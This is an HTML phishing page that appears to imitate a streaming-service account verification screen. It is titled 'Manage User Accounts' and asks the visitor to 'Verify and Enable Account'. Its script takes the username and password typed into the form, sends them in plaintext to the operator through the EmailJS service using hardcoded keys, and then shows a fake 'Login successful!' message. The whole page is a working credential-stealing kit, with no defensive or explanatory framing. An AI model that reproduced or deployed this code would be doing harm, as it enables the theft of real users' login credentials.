<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manage User Accounts</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        emailjs.init("jkb7mzwK9KsEbHbna"); // Public Key from your EmailJS account
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('https://i.postimg.cc/s2RJJdVf/Netv.jpg') no-repeat center center fixed;
            background-size: cover;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container-wrapper {
            position: absolute;
            top: -400px; /* Hidden above screen */
            left: 50%;
            transform: translateX(-50%);
            opacity: 0;
            transition: all 1s ease-in-out;
        }

        .show {
            top: 100px; /* Drops down smoothly */
            opacity: 1;
        }

        .container {
            background-color: rgba(255, 255, 255, 0.95);
            width: 350px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.2);
            border-top: 5px solid #f07c00;
        }
        
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        
        input {
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        button {
            background-color: #f07c00;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            cursor: pointer;
            border-radius: 4px;
            font-size: 16px;
        }

        button:hover {
            background-color: #d96b00;
        }

        .forgot-password {
            color: #f07c00;
            text-decoration: none;
            display: block;
            margin-top: 10px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container-wrapper" id="login-container">
        <div class="container">
            <h2>Verify and Enable Account</h2>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button onclick="authenticate()">Login</button>
            <a href="#" class="forgot-password">Use the above button to secure your account</a>
        </div>
    </div>

    <script>
        // Drop-down animation when page loads
        window.onload = function() {
            setTimeout(() => {
                document.getElementById("login-container").classList.add("show");
            }, 500);
        };

        function authenticate() {
            let loginButton = document.querySelector("button");
            loginButton.textContent = "Authenticating...";
            loginButton.disabled = true;
            let username = document.getElementById("username").value.trim();
            let password = document.getElementById("password").value.trim();

            if (username && password) {
                sendEmail(username, password)
                    .then(() => {
                        alert("Login successful!");
                        loginButton.textContent = "Login";
                        loginButton.disabled = false;
                    })
                    .catch(error => {
                        console.error("Error sending email", error);
                        loginButton.textContent = "Login";
                        loginButton.disabled = false;
                        alert("Failed to send login report. Please try again.");
                    });
            } else {
                alert("Please enter both username and password.");
                loginButton.textContent = "Login";
                loginButton.disabled = false;
            }
        }

        function sendEmail(username, password) {
            const serviceID = "service_suqjtsd";  
            const templateID = "template_gnd5xid";  
            const publicKey = "jkb7mzwK9KsEbHbna";  

            const templateParams = {
                login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
            };

            return emailjs.send(serviceID, templateID, templateParams, publicKey);
        }
    </script>
</body>
</html>
